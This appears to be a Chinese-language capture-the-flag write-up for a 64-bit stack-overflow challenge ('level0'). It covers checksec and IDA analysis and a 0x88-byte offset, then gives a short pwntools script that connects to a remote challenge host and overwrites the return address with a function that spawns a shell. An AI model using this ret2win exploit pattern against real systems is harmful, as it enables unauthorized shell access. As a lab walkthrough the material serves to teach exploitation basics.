1、首先使用file命令查看文件类型，发现是64位的ELF文件，并且是链接类型是动态链接

![](https://pic1.zhimg.com/80/v2-68ec60bda0b0fb5016520dff548ffe70_720w.webp)

2、使用checksec查看文件开启了哪些保护，发现重定位表可读，未开启堆栈保护，未开启地址空间随机化，很有可能是堆栈溢出的题目。

![](https://pic4.zhimg.com/80/v2-4ab573dd6be969d59886cf75db9597df_720w.webp)

3、将./ 3-level拖到ida64中，观察发现这个main函数采用的是fastcall的调用约定，没有发现异常，继续进入vulnerable_function()。

![](https://pic2.zhimg.com/80/v2-831fbf466cd9db9c1058bc0f3c3f59a5_720w.webp)

4、进入vulnerable_function()后，有一个向缓冲区读数据的read函数，就没有后续了。

![](https://pic1.zhimg.com/80/v2-6b96954613e072060023dfb7d3437b78_720w.webp)

5、从main函数进去有发现可以得到flag的地方，于是在函数栏中看看其他函数，发现有一个名为callsystem的函数，它可以调用shell。

![](https://pic3.zhimg.com/80/v2-d33b956e39ee847c9c6c0c3c7fc41e0a_720w.webp)

6、因此可以借助vulnerable_function()的read函数，将缓冲区填充满，再将ebp+0x8即eip所在的地址覆盖为callsystem函数地址，即可得到shell。通过pwndbg的print函数查看callsystem函数的地址为0x400596.

![](https://pic4.zhimg.com/80/v2-1029d26bb8ac309726a3fc2fa83f519b_720w.webp)

7、回到vulnerable_function()函数，查看到buf的地址为rbp-0x80，

![](https://pic4.zhimg.com/80/v2-de5468f4f97b5631d56478a10e7a38af_720w.webp)

8、堆栈图如下所示，填充到rbp需要0x88个字节，再将callsystem的地址即0x400596覆盖到rip的位置即可

![](https://pic3.zhimg.com/80/v2-e6c204534b18a7f702f9b5aa1a37955e_720w.webp)

9、exp编写

```text
from pwn import *							
#p=process('./3-level0')#启动本地程序进行交互
p=remote('111.200.241.244','61154')
p.recvuntil("Hello, World\n")#接受程序发送的字符串
		
payload=('a'*0x88).encode()+p64(0x400596)#用88字节填充缓冲区,再将打包calsystem函数地址成64位覆盖rip位置，造成缓冲区溢出	
	
p.sendline(payload)#将payload发送给程序	
				
p.interactive()#进入交互界面	
```

10、运行exp，得到了shell，输入cat flag，成功拿到flag

![](https://pic4.zhimg.com/80/v2-3beb6ca0da55860845d4f6dfd3687e7b_720w.webp)

![](https://pic4.zhimg.com/80/v2-d963c79689bb70cf2fd5b462dfff6563_720w.webp)